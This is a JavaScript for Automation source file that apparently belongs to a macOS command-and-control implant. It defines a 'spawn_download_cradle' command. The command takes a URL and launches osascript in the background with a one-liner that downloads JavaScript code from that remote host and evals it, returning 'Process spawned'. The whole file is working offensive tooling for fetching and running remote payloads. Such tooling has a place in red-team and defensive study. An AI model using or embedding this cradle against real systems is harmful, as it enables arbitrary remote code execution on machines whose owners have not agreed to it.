exports.spawn_download_cradle = function(task, command, params){
    try{
        let config = JSON.parse(params);
        if(!config.hasOwnProperty('url')){return {"user_output": "missing url parameter: 'a URL address where the jxa code is hosted'", "completed": true, "status": "error"};}
        let full_url = config['url'];
        let path = "/usr/bin/osascript";
        let args = ['-l','JavaScript','-e'];
        let nsurl = $.NSURL.URLWithString(full_url);
        let nsdata = $.NSData.dataWithContentsOfURL(nsurl);
        if(nsdata.js === undefined){
            return {"user_output":"Failed to fetch contents of URL", "completed": true, "status": "error"};
        }
        let nsstring = $.NSString.alloc.initWithDataEncoding(nsdata, $.NSUTF8StringEncoding);
        if(nsstring.js === ""){
            return {"user_output":"Got empty string from URL", "completed": true, "status": "error"};
        }
        let command = "eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(";
        command = command + "'" + full_url + "')),$.NSUTF8StringEncoding)));";
        args.push(command);
        args.push("&");
        try{
            let pipe = $.NSPipe.pipe;
            let file = pipe.fileHandleForReading;  // NSFileHandle
            let task = $.NSTask.alloc.init;
            task.launchPath = path;
            task.arguments = args;
            task.standardOutput = pipe;
            task.standardError = pipe;
            task.launch;
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
        return {"user_output":"Process spawned", "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
